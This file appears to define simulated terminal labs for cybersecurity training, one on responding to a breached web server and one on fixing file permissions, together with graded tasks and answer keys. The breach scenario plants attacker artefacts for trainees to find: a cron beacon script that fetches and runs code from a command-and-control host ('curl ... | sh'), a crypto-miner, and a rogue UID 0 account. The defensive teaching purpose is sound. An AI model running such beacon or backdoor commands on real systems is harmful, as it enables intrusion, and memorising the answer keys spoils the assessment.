'use strict';

/** Original cyber security terminal lab scenarios (simulated Linux machines; no real system is touched). */
const AUTH_LOG = [
  'Nov 24 02:09:51 web01 sshd[2211]: Failed password for root from 185.220.101.4 port 51122 ssh2',
  'Nov 24 02:10:03 web01 sshd[2211]: Failed password for root from 185.220.101.4 port 51122 ssh2',
  'Nov 24 02:10:17 web01 sshd[2214]: Failed password for admin from 185.220.101.4 port 51188 ssh2',
  'Nov 24 02:11:40 web01 sshd[2230]: Accepted password for deploy from 185.220.101.4 port 51302 ssh2',
  'Nov 24 02:12:58 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd -o -u 0 sysupd',
  'Nov 24 02:13:12 web01 sshd[2301]: Accepted password for sysupd from 185.220.101.4 port 51377 ssh2',
  'Nov 24 08:55:02 web01 sshd[3120]: Accepted publickey for analyst from 10.0.0.2 port 60112 ssh2',
].join('\n');

const hardening = {
  title: 'Respond to a compromised web server',
  hostname: 'web01',
  user: 'analyst',
  intro: 'web01 was breached overnight. Investigate the logs, remove the attacker\'s foothold and harden the server. Use sudo for privileged commands. When you find the attacker\'s IP address, run: submit <ip>',
  users: {
    analyst: { groups: ['analyst', 'sudo', 'adm'] },
    deploy: { groups: ['deploy', 'sudo'] },
    sysupd: { uid: 0, groups: ['root'] },
    'www-data': { uid: 33, groups: ['www-data'], shell: '/usr/sbin/nologin', home: '/var/www' },
  },
  files: {
    '/var/log/auth.log': { content: `${AUTH_LOG}\n`, mode: '640', owner: 'root', group: 'adm' },
    '/var/log/syslog': { content: 'Nov 24 02:15:00 web01 CRON[2402]: (root) CMD (/tmp/.x/beacon.sh)\nNov 24 02:16:00 web01 CRON[2410]: (root) CMD (/tmp/.x/beacon.sh)\n', mode: '640', owner: 'root', group: 'adm' },
    '/tmp/.x/beacon.sh': { content: '#!/bin/sh\ncurl -s http://185.220.101.4/c2 | sh\n', mode: '755', owner: 'root' },
    '/tmp/.x/miner': { content: 'ELF binary (xmrig build)\n', mode: '755', owner: 'www-data' },
    '/etc/ssh/sshd_config': { content: 'Port 22\nPermitRootLogin yes\nPasswordAuthentication yes\nX11Forwarding yes\n', mode: '644' },
    '/var/www/html/index.html': { content: '<h1>web01</h1>\n', owner: 'www-data' },
    '/home/analyst/README': { content: 'Incident ticket INC-4471: unusual outbound traffic from web01 since 02:15.\n', owner: 'analyst' },
  },
  services: {
    nginx: { port: 80, description: 'A high performance web server' },
    ssh: { port: 22, description: 'OpenBSD Secure Shell server', process: '/usr/sbin/sshd -D' },
    telnet: { port: 23, description: 'Telnet server (legacy, plaintext)', process: '/usr/sbin/in.telnetd' },
  },
  processes: [{ user: 'www-data', command: '/tmp/.x/miner --pool stratum+tcp://185.220.101.4:3333', cpu: 97.4 }],
  crontab: { root: ['# m h dom mon dow command', '* * * * * /tmp/.x/beacon.sh'] },
  firewall: { enabled: false, rules: [] },
  logins: [
    { user: 'deploy', from: '185.220.101.4', at: 'Mon Nov 24 02:11 - 02:40  (00:29)' },
    { user: 'sysupd', from: '185.220.101.4', at: 'Mon Nov 24 02:13 - 02:41  (00:28)' },
    { user: 'analyst', from: '10.0.0.2', at: 'Mon Nov 24 08:55   still logged in' },
  ],
  tasks: [
    { id: 'flag', title: 'Identify the attacker\'s IP address (submit <ip>)', marks: 1, check: { type: 'flag_submitted', flag: '185.220.101.4' } },
    { id: 'backdoor', title: 'Remove or lock the rogue UID 0 account', marks: 2, check: { type: 'user_locked', user: 'sysupd' } },
    { id: 'deploy', title: 'Remove the compromised "deploy" account from the sudo group', marks: 1, check: { type: 'user_not_in_group', user: 'deploy', group: 'sudo' } },
    { id: 'miner', title: 'Stop the crypto-miner process', marks: 1, check: { type: 'process_absent', contains: 'miner' } },
    { id: 'cron', title: 'Remove the beacon from root\'s crontab', marks: 1, check: { type: 'cron_absent', contains: 'beacon' } },
    { id: 'telnet', title: 'Stop and disable the telnet service', marks: 1, check: { type: 'service_state', service: 'telnet', active: false, enabled: false } },
    { id: 'ufw', title: 'Enable the firewall and deny port 23', marks: 1, check: [{ type: 'firewall_enabled' }, { type: 'firewall_denies', port: 23 }] },
    { id: 'rootlogin', title: 'Disable root login over SSH (PermitRootLogin no)', marks: 1, check: { type: 'file_contains', path: '/etc/ssh/sshd_config', regex: '^PermitRootLogin\\s+no\\s*$', flags: 'm' } },
  ],
};

const perms = {
  title: 'Fix file permissions on a shared server',
  hostname: 'files01',
  user: 'analyst',
  intro: 'An audit found sensitive files readable by everyone. Fix the permissions without breaking the service. Use sudo where needed.',
  users: { analyst: { groups: ['analyst', 'sudo'] }, app: { groups: ['app'] } },
  files: {
    '/etc/shadow': { content: '', mode: '644', owner: 'root', group: 'shadow' },
    '/opt/app/config/db.env': { content: 'DB_HOST=10.0.0.5\nDB_USER=app\nDB_PASSWORD=Sup3rS3cret!\n', mode: '666', owner: 'root' },
    '/opt/app/backup.sql': { content: '-- full dump\n', mode: '644', owner: 'root' },
  },
  tasks: [
    { id: 'shadow', title: '/etc/shadow must not be readable by others (mode 640 or stricter)', marks: 1, check: { type: 'file_mode', path: '/etc/shadow', max: '640' } },
    { id: 'env-owner', title: 'Make the app user the owner of /opt/app/config/db.env', marks: 1, check: { type: 'file_owner', path: '/opt/app/config/db.env', owner: 'app' } },
    { id: 'env-mode', title: 'Set /opt/app/config/db.env to mode 600', marks: 1, check: { type: 'file_mode', path: '/opt/app/config/db.env', mode: '600' } },
    { id: 'backup', title: 'Delete the stray database dump /opt/app/backup.sql', marks: 1, check: { type: 'file_absent', path: '/opt/app/backup.sql' } },
  ],
};

module.exports = [
  {
    topic: 'Incident response',
    difficulty: 4,
    tags: ['cyber', 'lab', 'incident-response', 'linux'],
    q: { type: 'lab', marks: 9, stem_html: '<p>You are the on-call security engineer. Use the terminal below to investigate and contain the breach on <code>web01</code>, then harden the server. Your work is checked automatically on the machine\'s final state.</p>', scenario: hardening, explanation_html: '<p>Read <code>/var/log/auth.log</code> to find 185.220.101.4, lock <code>sysupd</code> (<code>sudo usermod -L sysupd</code>), <code>sudo gpasswd -d deploy sudo</code>, <code>sudo pkill miner</code>, edit root\'s crontab (<code>sudo crontab -r</code>), <code>sudo systemctl disable --now telnet</code>, <code>sudo ufw enable</code> and <code>sudo ufw deny 23</code>, then set <code>PermitRootLogin no</code>.</p>' },
  },
  {
    topic: 'Linux permissions',
    difficulty: 2,
    tags: ['cyber', 'lab', 'linux', 'permissions'],
    q: { type: 'lab', marks: 4, stem_html: '<p>Use the terminal to fix the file permissions found in the audit.</p>', scenario: perms, explanation_html: '<p><code>sudo chmod 640 /etc/shadow</code>, <code>sudo chown app /opt/app/config/db.env</code>, <code>sudo chmod 600 /opt/app/config/db.env</code>, <code>sudo rm /opt/app/backup.sql</code>.</p>' },
  },
];
